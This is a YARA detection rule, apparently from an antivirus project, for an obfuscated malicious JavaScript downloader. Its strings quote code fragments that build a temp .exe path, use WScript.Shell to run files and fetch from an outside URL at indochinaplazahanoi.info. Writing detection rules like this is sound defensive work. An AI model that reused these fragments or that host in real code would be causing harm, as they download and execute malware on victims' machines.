rule sig_20160329_99628ed240669d60ff8b4cf05402b74d {
  meta:
    description = "datamaliciousorder - file 20160329_99628ed240669d60ff8b4cf05402b74d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94daee05510e7a853d02fd6216b0cba1b0d1db028f985f60d47287e7822f4bd9"

  strings:
    $s1  = "function Nakbflheva() {return Rescha[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"FXTaIn2SWhPAf30k.exe\";};" fullword ascii
    $s2  = "function Sizqftuu(Kiwktja, Kkkxxmwr){return Kiwktja - Kkkxxmwr;};" fullword ascii
    $s3  = "var Rescha = function Njftahxuas() {return WScript[Cgwrnuuh](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Ojmsqf](Jtbtacepaa() * 11)} while (Xkudrvycak[\"readystate\"] < 4 );" fullword ascii
    $s5  = "Xkudrvycak[Aapwrqwnxk](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Dyezq() {return ((Isuynipiw == true) && (Isuynipiw == Xglvljwnnw)) ? 1 : Rykku;};" fullword ascii
    $s7  = "function Errnxmv(Sfyqkuyove){Rescha[\"Run\"](Sfyqkuyove, Rykku, Rykku);};" fullword ascii
    $s8  = "Xglvljwnnw = true; " fullword ascii
    $s9  = "function Kmayvkjzdr()" fullword ascii
    $s10 = "var Bbggdvfpn = new this[\"Date\"]();" fullword ascii
    $s11 = "var Xglvljwnnw = false;" fullword ascii
    $s12 = "var Affps = false;" fullword ascii
    $s13 = "var Isuynipiw = false;" fullword ascii
    $s14 = "Isuynipiw = true; " fullword ascii
    $s15 = "return Sizqftuu(Gmcrpuunf, Liouugqzof);" fullword ascii
    $s16 = "function Jtbtacepaa(){return 22;};" fullword ascii
    $s17 = "function Lmypxotxys(){return Ducwvmp;};" fullword ascii
    $s18 = "function Fowekusxg(){return Cgwrnuuh;};" fullword ascii
    $s19 = " while (Igabadze){" fullword ascii
    $s20 = "function Rxgwrixl(Avgordb) {var Eriibypis = (1, 2, 3, 4, 5, Avgordb); return Eriibypis;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}